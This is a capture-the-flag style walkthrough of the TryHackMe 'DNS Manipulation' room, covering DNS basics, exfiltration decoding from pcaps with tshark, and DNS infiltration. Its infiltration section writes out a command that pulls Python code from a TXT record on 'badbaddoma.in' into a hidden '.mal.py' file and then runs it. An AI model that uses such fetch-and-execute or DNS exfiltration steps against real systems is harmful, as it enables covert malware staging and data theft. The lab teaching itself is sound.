# DNS Manipulation

**Room Link:** [**https://tryhackme.com/r/room/dnsmanipulation**](https://tryhackme.com/r/room/dnsmanipulation)



## Installation

### **\[ Python code used for DNS Exfiltration and Infiltration ]**

I have created a few simple scripts written in Python for you to complete this walkthrough. This will allow us to make DNS queries to a remote DNS Server.\
`git clone https://github.com/kleosdc/dns-exfil-infil`

Also, make sure you have the required Python3 modules in order to run the python code.

Use the following command to install the required modules:\


### `sudo pip3 install -r requirements.txt`

**\[ Program used for DNS Tunneling ]**

[https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)\


`sudo apt install iodine`

### \[ Download Wireshark ]

You may use Wireshark or tshark to capture packets. The python code uses .PCAP file to extract the captured data and then decode it.\
[https://www.wireshark.org/download.html](https://www.wireshark.org/download.html)

`sudo apt install -y tshark`

## What is DNS?

### Introduction

At a high level, a Domain Name System refers to a naming system that resolves domain names with IP addresses. DNS servers are distributed all across the world and they are constantly being updated and synced amongst each other in a systematic way. When a user makes a request using a domain name such as [tryhackme.com](http://tryhackme.com/), DNS 'translates' this to its IP address then ultimately supplies the requester with the correct IP address. It's also worth noting that in some scenarios the IP address returned by DNS won't always be the origin server's IP address If DNS records are being proxied by a service such as Cloudflare's DDoS protection.

Technically, every device connected to the internet has an IP address which acts as an identity when communicating with other internet devices. Therefore, it is essential to understand that the DNS's primary function and the hierarchy the 'translation' traverses.

DNS root name servers sit at the top or 'root' of the DNS hierarchy and play a critical role for the Internet. Information for all the top level domain (TLD) 'zones' such as .com, .co.uk, .net and their associated name servers are housed in the hundreds of root name servers that are distributed across the world.

Below is an illustration from Cloudflare to better picture this hierarchy.

<figure><img src="https://raw.githubusercontent.com/kleosdc/tryhackme-images/main/dnsmanipulation/dns-tld.png" alt=""><figcaption></figcaption></figure>

Source: [https://www.cloudflare.com/learning/dns/glossary/dns-root-server/](https://www.cloudflare.com/learning/dns/glossary/dns-root-server/)

Here are some resources that contain more information on root servers and DNS zones:

[https://www.cloudflare.com/learning/dns/glossary/dns-root-server/](https://www.cloudflare.com/learning/dns/glossary/dns-root-server/)

[https://www.cloudflare.com/learning/dns/glossary/dns-zone/](https://www.cloudflare.com/learning/dns/glossary/dns-zone/)

[https://www.iana.org/domains/root/servers](https://www.iana.org/domains/root/servers)

\


There are more DNS Record types. However, they won't be necessary to know in order to complete this walkthrough.

If you would like to learn more about DNS Record Types, please refer to this article:

[https://www.cloudflare.com/learning/dns/dns-records/](https://www.cloudflare.com/learning/dns/dns-records/).

### Answer the questions

**If you were on Windows, what command could you use to query a txt record for 'youtube.com'?**

```
nslookup -type=txt youtube.com
```

**If you were on Linux, what command could you use to query a txt record for 'facebook.com'?**

```
dig facebook.com txt
```

**AAAA stores what type of IP Address along with the hostname?**

```
ipv6
```

**Maximum characters for a DNS TXT Record is 256. (Yay/Nay)**

```
Nay (Max is 255)
```

**What DNS Record provides a domain name in reverse-lookup? (Research)**

```
PTR
```

**What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)**

```
2.203.168.192.in-addr.arpa
```

<figure><img src="../../.gitbook/assets/image (1195).png" alt=""><figcaption></figcaption></figure>

## What is DNS Exfiltration?

DNS Exfiltration is a cyberattack on servers via the DNS, which can be performed manually or automatically depending on the attacker's physical location and proximity to the target devices. In a manual scenario, attackers often gain unauthorized physical access to the targeted device to extract data from the environment. Whereas in automated DNS exfiltration, attackers use malware to conduct the data exfiltration while inside the compromised network.\


DNS is a service that will usually be available on a target machine and allowing outbound traffic typically over TCP or UDP port 53. This makes DNS a prime candidate for hackers to use for exfiltrating data.\


Data exfiltration through DNS could allow an attacker to transfer a large volume of data from the target environment. Moreover, DNS exfiltration is mostly used as a pathway to gather personal information such as social security numbers, intellectual property, or other personally identifiable information.

DNS exfiltration is mostly used by adding strings containing the desired 'loot' to DNS UDP requests. The string containing the loot would then be sent to a rogue DNS server that is logging these requests. To the untrained eye this could look like normal DNS traffic or these requests could be lost in the shuffle of many legit DNS requests.

### Answer the questions

**What is the maximum length of a DNS name? (Research) (Length includes dots!)**

```
253
```

## DNS Exfiltration - Practice



### Answer the questions

**\~/challenges/exfiltration/orderlist/**&#x20;

```
cat /home/user/challenges/exfiltration/orderlist/TASK 
```

<figure><img src="../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

```
cd /home/user/challenges/exfiltration/orderlist
tshark -r order.pcap -T fields -e dns.qry.name
```

<pre><code><strong>python3 ~/dns-exfil-infil/packetyGrabber.py
</strong>File captured: /home/user/challenges/exfiltration/orderlist/order.pcap
Filename output: /home/user/challenges/exfiltration/orderlist/results.txt
</code></pre>

<figure><img src="../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>



**ORDER-ID: 1**

**What is the Transaction name? (Type it as you see it)**

```
Network Equip.
```



**\~/challenges/exfiltration/orderlist/**&#x20;

**TRANSACTION: Firewall**

**How much was the Firewall? (Without the $)**

```
2500
```

**\~/challenges/exfiltration/identify/**

**Which file contains suspicious DNS queries?**

```
cd ~/challenges/exfiltration/identify/
cat TASK
```

<figure><img src="../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

Merge all the pcaps together to make it easier

```
mergecap -w merged.pcap cap*
tshark -r merged.pcap -T fields -e dns.qry.name
```

```
tshark -r merged.pcap -T fields -e dns.qry.name
```

<figure><img src="../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>



```
python3 ~/dns-exfil-infil/packetyGrabber.py
/home/user/challenges/exfiltration/identify/cap3.pcap
/home/user/challenges/exfiltration/identify/results.txt
```

<figure><img src="../../.gitbook/assets/image (1201).png" alt=""><figcaption></figcaption></figure>

**\~/challenges/exfiltration/identify/**

**Enter the plain-text after you have decoded the data using packetyGrabber.py found in \~/dns-exfil-infil/ folder.**

```
administrator:s3cre7P@ssword
```

## What is DNS Infiltration?

DNS infiltration is another method used by attackers to exploit the various vulnerabilities within an organization's Domain Name System. Unlike the exfiltration attacks on the DNS, infiltration defines the process where malicious code is ran to manipulate DNS servers either using automated systems where attackers connect remotely to the network infrastructure or manually.

DNS infiltration is primarily used for file dropping or malware staging efforts. With behavioral, signature based, or reputation based threat detection systems it's possible this attack method could be caught.

However, if this method of transporting data goes unnoticed it could lead to malicious activity such as code execution in organization's environment. Historically, this has caused havoc and disruption for various well known companies.

In summary, the DNS protocol could be used as a covert protocol that could aid in malware staging and execution efforts to communicate back to an attacker's C2 (Command and Control) server/s. In the next task we will explore how to could be achieved.

### Answer the questions

**What type of DNS Record is usually used to infiltrate data into a network?**

```
txt
```

## DNS Infiltration - Practice



### Answer the questions

**Follow the instructions in the TASK file to complete this question.**

**Enter the output from the executed python file**

```
cd ~/challenges/infiltration/
cat TASK
```

<figure><img src="../../.gitbook/assets/image (1202).png" alt=""><figcaption></figcaption></figure>

```
nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py
```

```
python3 ~/dns-exfil-infil/packetySimple.py
Filename: .mal.py
```

**Enter the output from the executed python file**

```
4.4.0-186-generic
```













\
